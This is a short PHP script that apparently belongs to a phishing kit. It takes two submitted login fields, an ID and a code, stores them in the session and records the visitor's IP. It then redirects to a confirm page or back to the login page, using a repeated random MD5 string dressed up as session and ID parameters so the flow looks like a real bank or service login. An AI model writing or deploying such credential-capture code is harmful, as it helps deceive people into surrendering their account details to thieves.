<?php
session_start();
include'ip.php';
$ip = MDgetIp();

$praga=rand();
$praga=md5($praga);


$_SESSION['id'] = $_POST['formtext1'];
$_SESSION['code'] = $_POST['formtext2'];

if(!empty($_POST['formtext1']) && !empty($_POST['formtext2'])){
header("Location: confirm.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

}else{
header("Location: login.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

}
	 
?>

